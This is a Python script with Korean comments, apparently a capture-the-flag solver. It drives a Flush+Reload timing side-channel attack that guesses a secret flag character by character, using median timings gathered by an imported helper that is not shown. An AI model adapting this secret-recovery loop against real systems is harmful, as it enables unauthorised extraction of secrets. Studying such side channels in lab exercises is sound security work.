import statistics
from concurrent.futures import ThreadPoolExecutor, as_completed
from pyreload.run import get_time_from_run


CHAR_SET = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
NOISE_SAMPLES = 8
MAX_LENGTH = 256  # 플래그의 최대 길이 설정


def test_character(c, known_flag, delay):
    """
    단일 문자를 테스트하는 함수 (병렬 실행용)
    
    Args:
        c: 테스트할 문자
        known_flag: 현재까지 찾은 플래그
        delay: 각 시도 사이의 지연 시간
    
    Returns:
        (문자, 중간값 시간, 성공여부) 튜플, 실패 시 (문자, None, False)
    """
    test_guess = known_flag + c
    time_measurements = []
    
    for _ in range(NOISE_SAMPLES):
        result = get_time_from_run(test_guess, delay=delay)
        time_val, is_success = result
        
        # Flag found!
        if is_success:
            return (c, 0, True)  # (char, time, success)
        
        if time_val is None:
            return (c, None, False)
        time_measurements.append(time_val)
    
    reliable_time = statistics.median(time_measurements)
    return (c, reliable_time, False)


def run_attack(delay, max_workers):
    """
    병렬 처리를 사용한 Flush+Reload 공격
    
    Args:
        delay: 각 시도 사이의 지연 시간 (기본값: 0.032초)
        max_workers: 병렬 처리에 사용할 최대 워커 수 (기본값: 3)
    """
    known_flag = ""

    for position in range(MAX_LENGTH):
        results = {}
        
        print(f"\n{'='*60}")
        print(f"Position {position + 1}: Testing {len(CHAR_SET)} characters in parallel...")
        print(f"{'='*60}")
        
        # 병렬로 모든 문자 테스트
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            # 모든 문자에 대한 작업 제출
            futures = {
                executor.submit(test_character, c, known_flag, delay): c 
                for c in CHAR_SET
            }
            
            # 완료되는 순서대로 결과 수집
            completed_count = 0
            for future in as_completed(futures):
                char, time_val, is_success = future.result()
                
                # Flag found!
                if is_success:
                    known_flag += char
                    print(f"\n\n{'='*60}")
                    print(f"🎉 SUCCESS! Flag found: {known_flag}")
                    print(f"{'='*60}")
                    return known_flag
                
                if time_val is None:
                    print("\n\nAbort! Test failed for character:", char)
                    print("Last successful guess:", known_flag)
                    return known_flag
                
                results[char] = time_val
                completed_count += 1
        
        print()  # 진행 바 후 줄바꿈
        
        # 가장 긴 실행 시간을 가진 문자 찾기
        best_char = max(results, key=results.get)
        best_time = results[best_char]
        
        known_flag += best_char
        
        # 결과 출력
        print(f"\n✓ Found next char: '{best_char}' (Time: {best_time})")
        print(f"📝 Current Flag: {known_flag}")
        
        # 상위 5개 후보 출력 (디버깅용)
        top_5 = sorted(results.items(), key=lambda x: x[1], reverse=True)[:5]
        print(f"\nTop 5 candidates:")
        for idx, (c, t) in enumerate(top_5, 1):
            marker = "★" if c == best_char else " "
            print(f"  {marker} {idx}. '{c}' -> {t}")
    
    return known_flag
